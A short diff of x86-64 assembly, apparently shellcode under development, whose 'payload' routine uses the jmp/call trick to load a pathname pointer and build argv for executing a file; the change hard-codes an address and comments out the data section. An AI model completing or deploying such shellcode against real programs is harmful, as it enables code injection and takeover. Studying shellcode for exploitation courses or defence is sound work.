@@ -17,7 +17,7 @@ main:
 
 payload:
 
-        movq    $file_to_run, %rcx
+        movq    $0x400521, %rcx
         movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         xorq    %rax, %rax               /* get a 64-bit zero value */
@@ -37,6 +37,6 @@ payload:
 callptr:
     call    payload                      /* push STRING ptr to stack */
 
-.section .data
-file_to_run:
-    .ascii  STRING
+//.section .data
+//file_to_run:
+//    .ascii  STRING
